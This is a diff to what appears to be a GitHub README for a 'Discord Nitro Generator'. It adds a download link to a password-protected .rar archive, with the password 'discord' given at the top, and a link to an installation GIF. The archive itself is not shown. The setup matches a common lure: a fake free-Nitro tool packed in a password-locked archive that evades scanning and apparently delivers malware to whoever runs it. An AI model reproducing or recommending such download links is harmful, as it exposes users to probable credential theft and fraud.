@@ -1,7 +1,7 @@
 ## Password: discord
 
 
-# [Download Nitro Generator]()
+# [Download Nitro Generator](https://github.com/lucasveneno/DiscordNitroGenerator/releases/download/Generator/NitroGenerator.rar)
 
 
 
@@ -15,7 +15,7 @@
 ### Installation
 
 
-![1]()
+![1](https://github.com/lucasveneno/DiscordNitroGenerator/releases/download/Generator/334034368-ea9b7c7a-cbcd-4f15-a8a0-4e9043f5efaa.gif)
 
 
 
